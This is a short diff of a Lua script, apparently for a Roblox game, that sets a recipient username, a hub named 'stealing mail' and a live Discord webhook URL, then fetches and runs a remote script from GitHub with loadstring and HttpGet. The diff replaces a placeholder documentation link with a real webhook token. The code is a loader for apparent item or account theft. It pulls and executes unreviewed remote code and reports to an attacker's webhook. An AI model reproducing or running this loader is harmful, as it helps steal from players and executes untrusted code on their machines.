@@ -1,6 +1,5 @@
 _G.Username = "accountd013" 
 _G.HubName = "stealing mail"
-_G.WebhookUrl = "https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks"
 _G.WebhookUrl = "https://discord.com/api/webhooks/1108975452539854928/mdDt-6b-VLPwVBu5udbM1Im3VieOzJTLvCMV66bgOoTMsmHdMOepKTYTU58xxQnJzL52"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
